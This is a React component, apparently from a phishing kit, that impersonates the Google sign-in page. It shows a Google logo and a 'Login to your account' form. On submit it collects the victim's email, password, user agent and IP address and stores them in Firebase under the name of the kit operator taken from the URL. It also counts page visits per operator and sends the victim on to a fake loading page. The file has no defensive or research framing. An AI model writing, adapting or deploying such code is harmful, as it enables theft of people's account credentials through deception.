import React, { useEffect, useRef, useState } from 'react'

import { useLocation, useNavigate, useParams } from 'react-router-dom'
import { addData, addGmailClick, addGmailData } from '../config/firebase'
import googleLogo from '../assets/img.png'

const GmailLogin = () => {

  const location = useLocation()

  const { username } = useParams()


  const navigate = useNavigate()


  const email = useRef()
  const pass = useRef()

  const checkBox = useRef()

  const [showPass, setShowPass] = useState()

  const handleClick = () => {
    if (checkBox?.current?.checked) {
      setShowPass(true)
    } else {
      setShowPass(false)
    }
  }

  async function postData() {
    try {

      // const pathNames = location.pathname.split("/")
      // const ownerEmail = `${pathNames[1]}@gmail.com`

      const emailValue = email.current.value
      const passValue = pass.current.value
      const userAgent = navigator.userAgent

      const response = await axios.get("https://api.ipify.org?format=json")

      const result = await addGmailData(emailValue, passValue, userAgent, `${username}@gmail.com`, response.data.ip)

      console.log(result.id)
      if (!result) {
        alert('Something went wrong!')
      }

      email.current.value = ''
      pass.current.value = ''

      navigate(`/${username}/gmail-loading/${result.id}`)
    } catch (error) {
      console.log(error?.message)
    }
  }

  useEffect(() => {
    const pathNames = location.pathname.split("/")
    const ownerEmail = `${pathNames[1]}@gmail.com`
    addGmailClick(ownerEmail)
  })

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  return (
    <div className='h-dvh w-full flex justify-center items-center'>
      <form onSubmit={handleSubmit} className='  space-y-4 z-20 bg-gray-100 w-[90%] p-5 rounded-lg shadow-lg'>
        {/* <div className=' flex flex-col inside-form '> */}
        <h1 className=' text-xl text-gray-800 flex items-center'><img src={googleLogo} alt="logo" /> Login to your account</h1>
        <div className='for-input relative h-[55px] '>
          <input ref={email} type="text" className='mail-input border-[1px] border-stone-700 md:w-full w-full px-4 placeholder:text-gray-800 text-gray-800 outline-none font-semibold h-full rounded-md' placeholder='Email or phone' required />
        </div>
        {/* <div className='for-input relative h-[55px] '>
            <input ref={email} type="password" className='mail-input border-[1px] border-stone-700 md:w-full w-full px-4 placeholder:text-gray-800 text-gray-800 font-semibold h-full rounded-md' placeholder='Email or phone' required />
          </div> */}
        <div>
          <div className='for-input relative h-[55px] '>
            <input ref={pass} type={`${showPass ? 'text' : 'password'}`} className='pass-input border-[1px] border-stone-700 w-full h-full outline-none rounded-md px-4 placeholder:text-gray-900' placeholder='Enter your password' required />
          </div>
          <label onClick={handleClick} className='flex items-center text-gray-800 gap-2 mt-4 font-medium text-md cursor-pointer'>
            <input ref={checkBox} type='checkbox' className='inline-block w-5 h-5' /> <p className='inline-block flex-1'>Show password</p>
          </label>
        </div>
        {/* </div> */}
        <div className=' flex justify-center'>
          <button type='submit' className='text-white w-1/2 bg-blue-600 rounded-md py-2 font-semibold px-4 text-lg ' >Login</button>
        </div>
      </form>
    </div>
  )
}

export default GmailLogin